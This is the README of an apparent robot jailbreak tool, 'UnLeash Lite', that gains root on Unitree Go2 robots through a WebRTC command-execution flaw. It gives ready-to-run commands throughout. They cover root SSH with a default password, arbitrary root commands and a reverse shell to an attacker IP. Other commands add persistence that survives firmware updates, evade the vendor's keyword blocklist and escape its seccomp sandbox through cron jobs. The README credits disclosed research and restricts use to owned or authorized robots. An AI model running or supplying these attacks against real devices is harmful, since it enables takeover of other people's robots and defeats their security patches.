<div align="center">

```
█   █  █   █  █      █████   ███    ████  █   █
█   █  ██  █  █      █      █   █  █      █   █
█   █  █ █ █  █      ████   █████   ███   █████
█   █  █  ██  █      █      █   █      █  █   █
 ███   █   █  █████  █████  █   █  ████   █   █
                     lite
```

<h2>WebRTC Jailbreak for Unitree Go2 (and more!)</h2>

</div>
UnLeash Lite enables root-level SSH access on the Unitree Go2 by uploading Python payloads over the WebRTC data channel (the same channel the Unitree app uses). The payload is bound to a controller hotkey and executes as root when pressed.

**Requirements:** LAN access to the robot + a physical controller (or DDS button simulation).

### Firmware Support

| Firmware | SSH Method | Status |
|----------|-----------|--------|
| 1.1.7 -- 1.1.11 | `ssh` | Confirmed |
| 1.1.12 -- 1.1.13 | `ssh` | Untested (should work) |
| 1.1.14 | `bypass-ssh` | In progress -- needs tester confirmation |
| 1.1.15 | `bypass-ssh --aes-key` | In progress -- needs tester confirmation |

> Firmware 1.1.14 added a keyword blocklist, seccomp sandbox, and UUID validation to `programming_actuator`. We've reverse-engineered the changes and implemented bypasses, but they haven't been validated on hardware yet. If you're on 1.1.14/1.1.15 and can test, please open an issue with your results!

## Quick Start

### Firmware 1.1.7 -- 1.1.13

```bash
pip install .
python -m unleash_lite ssh
```

Press **L1+Y** on the controller. Then `ssh root@192.168.123.161` (password: `unleash`).

### Firmware 1.1.14

Unitree added a keyword blocklist and seccomp sandbox in 1.1.14. Use `bypass-ssh`, which stages a cron job to enable SSH outside the sandbox:

```bash
pip install .
python -m unleash_lite bypass-ssh
```

Press **L1+Y** on the controller, then wait up to 60 seconds for the cron job to fire. Then `ssh root@192.168.123.161` (password: `unleash`).

### Firmware 1.1.15

Same as 1.1.14, but Unitree also added per-device WebRTC authentication. You need your robot's AES key first:

```bash
pip install .

# Fetch your device key from the Unitree cloud
python -m unleash_lite fetch-key --email you@example.com

# Run the jailbreak with your key
python -m unleash_lite bypass-ssh --aes-key <your-32-hex-char-key>
```

Press **L1+Y**, wait up to 60 seconds, then `ssh root@192.168.123.161` (password: `unleash`).

> **Custom password:** Add `--password <your-password>` to any of the commands above.

## Install

```bash
pip install .
```

## Usage

The modes below give you full control. For most users, the Quick Start above is all you need.

```bash
# Enable SSH (firmware <= 1.1.13 only)
python -m unleash_lite ssh

# Enable SSH via cron bypass (firmware >= 1.1.14)
python -m unleash_lite bypass-ssh

# Persistent SSH that survives reboots and OTA updates (firmware <= 1.1.13)
python -m unleash_lite ssh-persist

# Run an arbitrary command as root (firmware <= 1.1.13)
python -m unleash_lite custom --cmd "id"

# Reverse shell (firmware <= 1.1.13)
python -m unleash_lite reverse-shell --attacker-ip 192.168.123.100
```

After running, press **L1+Y** on the Go2 controller to execute the payload. For `bypass-*` modes, wait up to 60 seconds for the cron job.

### Fetching the AES key (firmware >= 1.1.15)

Firmware 1.1.15 added per-device WebRTC authentication. You need the robot's AES-128 key (32 hex characters) to connect.

If you have the robot paired in the Unitree app, fetch the key from the cloud:

```bash
# Print keys for all robots on your account
python -m unleash_lite fetch-key --email you@example.com

# Get key for a specific robot
python -m unleash_lite fetch-key --email you@example.com --sn B42D2000XXXXXXXX
```

If you already have SSH access, read it directly:

```bash
ssh root@192.168.123.161 'xxd -p /unitree/etc/key/aes_key.bin'
```

Then pass it with `--aes-key`:

```bash
python -m unleash_lite bypass-ssh --aes-key <key>
```

On firmware 1.1.14 and below, `--aes-key` is not needed.

## Modes

| Mode | Firmware | Description |
|------|----------|-------------|
| `ssh` | <= 1.1.13 | Enable SSH and set root password |
| `ssh-persist` | <= 1.1.13 | Persistent SSH with a guard service that survives reboots and OTA updates |
| `custom` | <= 1.1.13 | Run any shell command as root |
| `reverse-shell` | <= 1.1.13 | Open a reverse shell to a specified IP |
| `bypass-ssh` | >= 1.1.14 | Enable SSH via cron job (CVE-2026-27509 bypass) |
| `bypass-hosts` | >= 1.1.14 | Write MQTT DNS redirect to `/etc/hosts` (CVE-2026-27509 bypass) |
| `bypass-file` | >= 1.1.14 | Write arbitrary file content (CVE-2026-27509 bypass) |
| `bypass-cron` | >= 1.1.14 | Install a cron job for command execution (CVE-2026-27509 bypass) |
| `bypass-escalate` | >= 1.1.14 | Two-press self-overwrite escalation (CVE-2026-27509 bypass) |

Firmware 1.1.14 added a keyword blocklist and seccomp sandbox to `programming_actuator`. The `bypass-*` modes encode payloads as byte arrays and use `np.savetxt` for file I/O to avoid the filter. `bypass-cron` and `bypass-ssh` additionally escape the seccomp sandbox by staging commands as cron jobs that execute outside the sandbox.

## Options

```
--robot-ip IP        Robot IP address (default: 192.168.123.161)
--port PORT          WebRTC signaling port (default: 9991)
--hotkey HOTKEY       Controller hotkey binding (default: L1+Y)
--password PASS      Root password for ssh modes (default: unleash)
--cmd CMD            Shell command for 'custom' / 'bypass-cron' mode
--attacker-ip IP     Target IP for reverse-shell / bypass-hosts
--aes-key KEY        Per-device AES-128 key for firmware >= 1.1.15 (32 hex chars)
--callback-ip IP     This machine's IP for verification (auto-detected)
--callback-port PORT Callback listener port (default: 19999)
--no-callback        Skip callback verification
--timeout SECS       Callback wait timeout (default: 120s)
--debug              Enable debug logging (dumps all DDS messages)
```

### Diagnostics

If things aren't working, run the diagnostic probe to dump the raw DDS responses from the robot:

```bash
python -m unleash_lite probe --debug
python -m unleash_lite probe --aes-key <key> --debug   # firmware >= 1.1.15
```

## How It Works

1. Connects to the robot's WebRTC signaling endpoint over HTTP (port 9991)
2. Establishes a WebRTC data channel (the same one the Unitree app uses)
3. Uploads a Python script via the `programming_actuator` DDS API
4. Binds the script to a controller hotkey
5. When you press the hotkey, the robot executes the script as root

**Firmware differences:**

- **<= 1.1.13:** WebRTC uses a static fleet-wide AES key. Scripts execute as plain Python with no restrictions.
- **1.1.14:** Unitree added a keyword blocklist and seccomp sandbox (`py_script_execute_env`). UUID validation requires exactly 10 digits. The `bypass-*` modes evade the keyword filter using byte-encoded strings and `np.savetxt`. `bypass-ssh` and `bypass-cron` escape the sandbox by staging commands as cron jobs.
- **>= 1.1.15:** Same as 1.1.14, plus per-device AES-128 WebRTC authentication (see `fetch-key` above).

## Acknowledgments

This tool builds on publicly disclosed security research by multiple independent teams. Credit where it's due:

**Olivier Laflamme (Boschko) and Ruikai Peng** discovered that `programming_actuator` executes arbitrary Python as root with no authentication ([CVE-2026-27509](https://nvd.nist.gov/vuln/detail/CVE-2026-27509)). Their exploit reaches it by joining DDS domain 0 directly on the LAN. UnLeash Lite exploits the same underlying vulnerability but delivers payloads through the WebRTC data channel instead (see below). Their writeup at [boschko.ca](https://boschko.ca/unitree-go2-rce/) documents the DDS attack chain.

**Andreas Makris (Bin4ry), Kevin Finisterre (h0stile), and Konstantin Severov (legion1581)** disclosed the broader Unitree security architecture weaknesses ([CVE-2025-35027](https://nvd.nist.gov/vuln/detail/CVE-2025-35027), [arXiv:2509.14139](https://arxiv.org/abs/2509.14139)): hardcoded AES keys, the WebRTC signaling protocol, and the fleet-wide shared cryptographic material that makes the WebRTC connection possible. legion1581's [`unitree_webrtc_connect`](https://github.com/legion1581/unitree_webrtc_connect) was foundational for the WebRTC data channel implementation.

UnLeash Lite does not use BLE (the specific attack vector in CVE-2025-35027) or direct DDS (the delivery method in CVE-2026-27509).

## Legal

This software is provided for **security research, education, and
right-to-repair purposes only**. By using it, you agree that:

- You own the robot you are targeting, or have explicit written
  authorization from its owner.
- You are solely responsible for complying with all applicable local,
  state, national, and international laws.
- The authors and contributors accept no liability for damages,
  legal consequences, or misuse arising from this software.

## License

MIT
